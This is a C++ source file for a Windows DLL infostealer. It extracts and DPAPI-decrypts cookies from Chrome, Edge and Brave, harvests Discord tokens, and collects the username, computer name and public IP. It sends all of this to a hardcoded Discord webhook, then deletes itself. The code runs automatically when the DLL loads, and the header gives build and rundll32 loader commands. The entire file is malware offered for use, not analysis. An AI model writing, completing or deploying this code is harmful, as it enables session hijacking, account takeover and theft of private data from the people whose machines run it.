// ============================================================================
// stealer.cpp - Windows DLL payload
// Reads Chrome/Edge/Brave cookies (decrypts DPAPI), Discord tokens, sends
// everything to a Discord webhook. Self-deletes after run.
//
// Build (Visual Studio Developer Command Prompt):
//   cl /LD /O2 /EHsc stealer.cpp advapi32.lib crypt32.lib winhttp.lib
// Or use cmake/Makefile if preferred.
//
// Loader call (from PowerShell or rundll32):
//   rundll32.exe stealer.dll,Run
// ============================================================================

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winhttp.h>
#include <dpapi.h>
#include <shlobj.h>
#include <shlwapi.h>
#include <string>
#include <vector>
#include <fstream>
#include <sstream>
#include <regex>
#include <filesystem>
#include <random>
#include <thread>
#include <algorithm>
#include <iostream>
#include <unordered_set>
#include <unordered_map>
#include <cstdio>
#include <cstring>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "crypt32.lib")

namespace fs = std::filesystem;

// ============================================================================
// Config
// ============================================================================
const char* WEBHOOK = "https://discord.com/api/webhooks/1476791698041339997/tRLjlN11V6jBrSfHak-PcMTpty-sjHAPglOXl5Gs92UH0nCz0bukhQuuMmv0b_uNj6Pi";
const wchar_t* USER_AGENT = L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";

// ============================================================================
// HTTP webhook
// ============================================================================
static void WebhookSend(const std::string& title, const std::string& content, int color = 5793266) {
    // Escape content for JSON
    std::string escaped;
    for (char c : content) {
        if (c == '\\') escaped += "\\\\";
        else if (c == '"') escaped += "\\\"";
        else if (c == '\n') escaped += "\\n";
        else if (c == '\r') escaped += "\\r";
        else if (c == '\t') escaped += "\\t";
        else if ((unsigned char)c < 0x20) { /* skip */ }
        else escaped += c;
        if (escaped.size() > 1800) { escaped += "..."; break; }
    }

    std::string body = std::string("{\"username\":\"stealer\",\"embeds\":[{\"title\":\"") + title + "\",\"description\":\"```" + escaped + "```\",\"color\":" + std::to_string(color) + "}]}";

    // Open session
    HINTERNET hSession = WinHttpOpen(USER_AGENT, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return;

    // Parse URL
    std::wstring hook(WEBHOOK, WEBHOOK + strlen(WEBHOOK));
    URL_COMPONENTS urlComp = { sizeof(URL_COMPONENTS) };
    wchar_t hostName[256] = {0};
    wchar_t urlPath[2048] = {0};
    urlComp.lpszHostName = hostName;
    urlComp.dwHostNameLength = 256;
    urlComp.lpszUrlPath = urlPath;
    urlComp.dwUrlPathLength = 2048;
    urlComp.dwSchemeLength = -1;
    if (!WinHttpCrackUrl(hook.c_str(), (DWORD)hook.size(), 0, &urlComp)) {
        WinHttpCloseHandle(hSession);
        return;
    }

    HINTERNET hConnect = WinHttpConnect(hSession, hostName, urlComp.nPort, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return; }

    DWORD flags = (urlComp.nScheme == INTERNET_SCHEME_HTTPS) ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", urlPath, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return; }

    std::wstring headers = L"Content-Type: application/json\r\n";
    WinHttpAddRequestHeaders(hRequest, headers.c_str(), (DWORD)headers.size(), WINHTTP_ADDREQ_FLAG_ADD);

    WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, (LPVOID)body.c_str(), (DWORD)body.size(), (DWORD)body.size(), 0);
    WinHttpReceiveResponse(hRequest, NULL);
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
}

// ============================================================================
// Base64 encode (for raw cookie bytes)
// ============================================================================
static std::string Base64Encode(const std::vector<BYTE>& data) {
    static const char* chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string out;
    int val = 0, valb = -6;
    for (BYTE c : data) {
        val = (val << 8) + c;
        valb += 8;
        while (valb >= 0) {
            out.push_back(chars[(val >> valb) & 0x3F]);
            valb -= 6;
        }
    }
    if (valb > -6) out.push_back(chars[((val << 8) >> (valb + 8)) & 0x3F]);
    while (out.size() % 4) out.push_back('=');
    return out;
}

// ============================================================================
// DPAPI decrypt (uses current user's master key)
// ============================================================================
static std::vector<BYTE> DpapiDecrypt(const std::vector<BYTE>& encrypted) {
    DATA_BLOB in = { (DWORD)encrypted.size(), (BYTE*)encrypted.data() };
    DATA_BLOB out = { 0, NULL };
    if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out)) {
        std::vector<BYTE> result(out.pbData, out.pbData + out.cbData);
        LocalFree(out.pbData);
        return result;
    }
    return {};
}

// ============================================================================
// Minimal SQLite reader - returns rows of a table
// ============================================================================
struct SqliteReader {
    std::vector<BYTE> data;
    int pageSize;

    SqliteReader(const std::vector<BYTE>& d) : data(d) {
        if (d.size() >= 100 && memcmp(d.data(), "SQLite format 3", 15) == 0) {
            pageSize = d[16] | (d[17] << 8) | (d[18] << 16) | (d[19] << 24);
            if (pageSize <= 0 || pageSize > 65536) pageSize = 4096;
        } else {
            pageSize = 0;
        }
    }

    static UINT64 ReadVarint(const std::vector<BYTE>& b, size_t& i) {
        UINT64 v = 0;
        for (int j = 0; j < 9; j++) {
            if (i >= b.size()) return 0;
            BYTE bb = b[i++];
            v = (v << 7) | (bb & 0x7F);
            if ((bb & 0x80) == 0) return v;
        }
        return v;
    }

    // Read a cell value, return as byte vector (will be cast to string/int later)
    std::vector<BYTE> ReadCellValue(size_t& i, UINT64 colType) {
        std::vector<BYTE> result;
        if (colType == 0) return result;
        if (colType == 8) { result.push_back(0); return result; }  // integer 0
        if (colType == 9) { result.push_back(1); return result; }  // integer 1
        if (colType >= 1 && colType <= 6) { i += 8; return result; }  // skip int types
        if (colType == 7) { i += 8; return result; }  // int64
        if (colType >= 12 && (colType % 2) == 0) {
            UINT64 len = ReadVarint(data, i);
            if (i + len > data.size()) return result;
            result.assign(data.begin() + i, data.begin() + i + len);
            i += len;
            return result;
        }
        if (colType >= 13 && (colType % 2) == 1) {
            UINT64 len = ReadVarint(data, i);
            if (i + len > data.size()) return result;
            result.assign(data.begin() + i, data.begin() + i + len);
            i += len;
            return result;
        }
        return result;
    }

    std::vector<std::vector<std::vector<BYTE>>> ReadAllRows() {
        std::vector<std::vector<std::vector<BYTE>>> allRows;
        if (pageSize == 0) return allRows;
        size_t pageCount = data.size() / pageSize;
        for (size_t p = 1; p < pageCount; p++) {
            size_t pageOffset = p * pageSize;
            if (pageOffset + 8 >= data.size()) break;
            BYTE pageType = data[pageOffset];
            if (pageType != 0x0d && pageType != 0x0a) continue;
            UINT16 cellCount = data[pageOffset + 3] | (data[pageOffset + 4] << 8);
            size_t cellPtr = pageOffset + 8;
            for (UINT16 c = 0; c < cellCount; c++) {
                if (cellPtr + 2 >= data.size()) break;
                size_t cellOffset = pageOffset + (data[cellPtr] | (data[cellPtr + 1] << 8));
                cellPtr += 2;
                if (cellOffset + 8 >= data.size()) continue;
                size_t pos = cellOffset;
                ReadVarint(data, pos);  // payload size
                ReadVarint(data, pos);  // rowid
                UINT16 headerSize = data[pos] | (data[pos + 1] << 8);
                size_t dataStart = pos + headerSize;
                size_t headerIdx = pos + 1;
                std::vector<UINT64> types;
                for (int h = 0; h < 30; h++) {
                    UINT64 t = ReadVarint(data, headerIdx);
                    if (t == 0) break;
                    types.push_back(t);
                }
                std::vector<std::vector<BYTE>> row;
                for (UINT64 t : types) {
                    row.push_back(ReadCellValue(dataStart, t));
                }
                if (row.size() >= 3) allRows.push_back(row);
            }
        }
        return allRows;
    }
};

static std::string ToStr(const std::vector<BYTE>& v) {
    return std::string(v.begin(), v.end());
}

// ============================================================================
// Read file
// ============================================================================
static std::vector<BYTE> ReadFile(const std::wstring& path) {
    std::ifstream f(path, std::ios::binary);
    if (!f) return {};
    f.seekg(0, std::ios::end);
    size_t size = f.tellg();
    f.seekg(0);
    std::vector<BYTE> data(size);
    f.read((char*)data.data(), size);
    return data;
}

// ============================================================================
// Chrome cookie extraction
// ============================================================================
static void ExfilChrome(const std::wstring& brand, const std::wstring& userDataPath) {
    if (!fs::exists(userDataPath)) return;

    int count = 0;
    for (auto& entry : fs::recursive_directory_iterator(userDataPath)) {
        if (!entry.is_regular_file()) continue;
        if (entry.path().filename() != L"Cookies") continue;

        std::wstring path = entry.path().wstring();
        auto data = ReadFile(path);
        if (data.empty()) continue;

        // Copy to temp (in case locked)
        std::wstring tempPath = std::wstring(_wgetenv(L"TEMP")) + L"\\cookies_" + std::to_wstring(GetTickCount()) + L".db";
        std::ofstream out(tempPath, std::ios::binary);
        out.write((char*)data.data(), data.size());
        out.close();

        auto tempData = ReadFile(tempPath);
        DeleteFileW(tempPath.c_str());
        if (tempData.empty()) continue;

        SqliteReader reader(tempData);
        auto rows = reader.ReadAllRows();
        for (auto& row : rows) {
            // Chrome cookies schema: creation_utc(0), host_key(1), top_frame_site_key(2), name(3), value(4), encrypted_value(5), path(6), ...
            if (row.size() < 7) continue;
            std::string host = ToStr(row[1]);
            std::string name = ToStr(row[3]);
            if (host.empty()) continue;

            std::string value;
            if (!row[5].empty()) {
                // Strip "v10" prefix
                std::vector<BYTE> enc = row[5];
                if (enc.size() >= 3 && enc[0] == 'v' && enc[1] == '1' && enc[2] == '0') {
                    std::vector<BYTE> stripped(enc.begin() + 3, enc.end());
                    auto dec = DpapiDecrypt(stripped);
                    if (!dec.empty()) value = ToStr(dec);
                }
                if (value.empty()) {
                    auto dec = DpapiDecrypt(enc);
                    if (!dec.empty()) value = ToStr(dec);
                }
            } else {
                value = ToStr(row[4]);
            }
            if (!value.empty() && value.size() < 4000) {
                std::wstring brandW(brand.begin(), brand.end());
                std::string brandS(brand.begin(), brand.end());
                std::string title = brandS + " [" + host + "]";
                WebhookSend(title, name + " = " + value, 15844367);
                count++;
                if (count >= 200) break;
            }
        }
        if (count >= 200) break;
    }
    if (count > 0) {
        std::wstring brandW(brand.begin(), brand.end());
        WebhookSend(std::string(brand.begin(), brand.end()) + " done", std::to_string(count) + " cookies exfiltrated");
    }
}

// ============================================================================
// Discord token extraction (leveldb regex)
// ============================================================================
static void ExfilDiscord() {
    wchar_t appdata[MAX_PATH];
    GetEnvironmentVariableW(L"APPDATA", appdata, MAX_PATH);
    std::wstring base = std::wstring(appdata) + L"\\discord\\Local Storage\\leveldb";
    if (!fs::exists(base)) {
        // Try other variants
        const wchar_t* variants[] = { L"\\discordcanary\\", L"\\discordptb\\", L"\\Lightcord\\" };
        for (auto v : variants) {
            base = std::wstring(appdata) + v + L"Local Storage\\leveldb";
            if (fs::exists(base)) break;
        }
    }
    if (!fs::exists(base)) {
        WebhookSend("Discord", "no leveldb found");
        return;
    }

    std::unordered_set<std::string> seen;
    for (auto& entry : fs::directory_iterator(base)) {
        if (!entry.is_regular_file()) continue;
        std::wstring ext = entry.path().extension().wstring();
        if (ext != L".ldb" && ext != L".log") continue;

        std::vector<BYTE> data = ReadFile(entry.path().wstring());
        if (data.empty()) continue;
        std::string content(data.begin(), data.end());

        // mfa. tokens (MFA)
        std::regex mfaRegex(R"(mfa\.[A-Za-z0-9_\-]{84,})");
        auto begin = std::sregex_iterator(content.begin(), content.end(), mfaRegex);
        auto end = std::sregex_iterator();
        for (auto it = begin; it != end; ++it) {
            seen.insert(it->str());
        }

        // Standard tokens
        std::regex tokenRegex(R"([A-Za-z0-9_\-]{24,}\.[A-Za-z0-9_\-]{6,}\.[A-Za-z0-9_\-]{27,})");
        begin = std::sregex_iterator(content.begin(), content.end(), tokenRegex);
        for (auto it = begin; it != end; ++it) {
            std::string t = it->str();
            if (t.rfind("eyJ", 0) != 0) seen.insert(t);
        }
    }

    for (auto& t : seen) {
        WebhookSend("Discord token", t, 5793266);
    }
    WebhookSend("Discord done", std::to_string(seen.size()) + " tokens found");
}

// ============================================================================
// Recon
// ============================================================================
static void Recon() {
    wchar_t user[256] = {0}, comp[256] = {0};
    GetEnvironmentVariableW(L"USERNAME", user, 256);
    GetEnvironmentVariableW(L"COMPUTERNAME", comp, 256);
    std::string body = std::string("user: ") + ToStr(std::vector<BYTE>((BYTE*)user, (BYTE*)user + wcslen(user) * 2)) +
                       "\npc: " + ToStr(std::vector<BYTE>((BYTE*)comp, (BYTE*)comp + wcslen(comp) * 2)) +
                       "\nos: Windows " + std::to_string(_WIN32_WIN32);

    // Get public IP via webfetch (simple)
    HINTERNET hSession = WinHttpOpen(USER_AGENT, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (hSession) {
        HINTERNET hConnect = WinHttpConnect(hSession, L"api.ipify.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
        if (hConnect) {
            HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
            if (hRequest) {
                WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
                if (WinHttpReceiveResponse(hRequest, NULL)) {
                    std::string ip;
                    BYTE buf[1024];
                    DWORD read;
                    while (WinHttpReadData(hRequest, buf, sizeof(buf), &read) && read > 0) {
                        ip.append((char*)buf, read);
                    }
                    if (!ip.empty()) body += "\nip: " + ip;
                }
                WinHttpCloseHandle(hRequest);
            }
            WinHttpCloseHandle(hConnect);
        }
        WinHttpCloseHandle(hSession);
    }
    WebhookSend("Victim machine", body, 3066993);
}

// ============================================================================
// Main
// ============================================================================
static DWORD WINAPI MainThread(LPVOID param) {
    Sleep(2000);  // brief delay so the loader finishes

    Recon();

    wchar_t localAppData[MAX_PATH];
    GetEnvironmentVariableW(L"LOCALAPPDATA", localAppData, MAX_PATH);

    // Chrome
    ExfilChrome(L"Chrome", std::wstring(localAppData) + L"\\Google\\Chrome\\User Data");
    ExfilChrome(L"Edge", std::wstring(localAppData) + L"\\Microsoft\\Edge\\User Data");
    ExfilChrome(L"Brave", std::wstring(localAppData) + L"\\BraveSoftware\\Brave-Browser\\User Data");

    // Discord
    ExfilDiscord();

    WebhookSend("Done", "All exfil complete. DLL exiting.", 3066993);

    // Self-delete
    wchar_t path[MAX_PATH];
    GetModuleFileNameW(NULL, path, MAX_PATH);
    MoveFileExW(path, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
    // Better: schedule deletion via cmd
    std::wstring delCmd = L"cmd /c ping 127.0.0.1 -n 3 > nul && del \"" + std::wstring(path) + L"\"";
    _wsystem(delCmd.c_str());

    return 0;
}

extern "C" __declspec(dllexport) void Run() {
    CreateThread(NULL, 0, MainThread, NULL, 0, NULL);
}

extern "C" __declspec(dllexport) void __Run() { Run(); }

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        CreateThread(NULL, 0, MainThread, NULL, 0, NULL);
    }
    return TRUE;
}
